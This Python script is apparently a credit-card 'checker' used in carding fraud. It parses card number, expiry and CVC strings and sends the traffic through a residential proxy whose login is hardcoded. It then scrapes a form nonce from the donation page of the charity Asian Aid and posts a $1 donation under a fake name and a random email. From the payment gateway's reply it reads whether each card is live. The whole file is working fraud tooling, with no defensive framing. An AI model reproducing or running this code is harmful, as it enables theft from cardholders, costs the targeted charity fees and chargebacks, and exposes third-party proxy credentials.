import requests,re
import random
from proxy import reqproxy, make_request
def Tele(ccx):
	proxy_str = "brd.superproxy.io:33335:brd-customer-hl_d4a33102-zone-scrapping:brgtmv5nyk7u"
	session, ip = reqproxy(proxy_str)
	#print(f"IP Address: {ip}")
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	if n.startswith("4"):
		card_type = "visa"
	if n.startswith("5"):
		card_type = "mastercard"
	if n.startswith("3"):
		card_type = "americanexpress"
	if n.startswith("6"):
		card_type = "discover"
	r = requests.session()
	
	random_amount1 = random.randint(1, 9)
	random_amount2 = random.randint(1, 99)
	
	headers = {
	    'authority': 'www.asianaid.org.au',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'cache-control': 'max-age=0',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'none',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	response = session.get('https://www.asianaid.org.au/myaccount/payment/', headers=headers)
	
	nonce = re.search(r'id="_nonce" name="_nonce" value="(.*?)"', response.text).group(1)
	#print(nonce)
	
	cookies = {
	    'Anon': '1',
	    'PHPSESSID': 'ef56ee22e0fe3000e97e482c2df30fc3',
	    '_ga': 'GA1.1.1777351347.1752773444',
	    '_ga_NY8EP6FDJX': 'GS2.1.s1752773443$o1$g0$t1752773443$j60$l0$h0',
	    '_fbp': 'fb.2.1752773443851.743423763794101185',
	    'ap3pages': '1',
	    'ap3c': 'IGh5M0SQ4e6mveQAAGh5M0T4pf73_iSrSDgCQ3DdHqu5wQn9-A',
	    'ap3sessionkey': '006879334490e1eea6bde3e2',
	    'ap3sess': '67c8e9e0df06049e7bfc0cb6',
	    'ap3shown': '67c8e9e0df06049e7bfc0cb6',
	    'ap3dm': '67c8e9e0df06049e7bfc0cb6',
	}
	
	headers = {
	    'authority': 'www.asianaid.org.au',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'cache-control': 'max-age=0',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://www.asianaid.org.au',
	    'referer': 'https://www.asianaid.org.au/myaccount/payment/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'same-origin',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = {
	    'donateProject[]': '102',
	    'donateAmount[]': '1',
	    'creditcard_firstName': 'Rodam',
	    'creditcard_lastName': 'User',
	    'creditcard_email': f'rodamuser{random_amount1}{random_amount2}@gmail.com',
	    'creditcard_homePhone': '',
	    'creditcard_privateAddress1': '',
	    'creditcard_privateCity': '',
	    'creditcard_privateState_auStates': '',
	    'creditcard_privateState_usStates': '',
	    'creditcard_privateState': '',
	    'creditcard_privatePostCode': '',
	    'creditcard_privateCountryId': 'TH',
	    'creditcard_gatewayId': '3',
	    'creditcard_3_creditCard_name': 'Rodam User',
	    'creditcard_3_creditCard_number': n,
	    'creditcard_3_creditCard_type': card_type,
	    'creditcard_3_creditCard_expiry[0]': mm,
	    'creditcard_3_creditCard_expiry[1]': f'20{yy}',
	    'creditcard_3_creditCard_ccv': cvc,
	    'process-payment': '1',
	    '_nonce': nonce,
	    '_wp_http_referer': '/myaccount/payment/',
	}
	
	response = session.post('https://www.asianaid.org.au/myaccount/payment/', cookies=cookies, headers=headers, data=data)
	
	try:
		result = re.search(r'Payment processing failed: (.*?)<br \/>', response.text).group(1)
	except:
		result = re.search(r'<div class="b-(.*?)">', response.text).group(1)
		
	return (result)
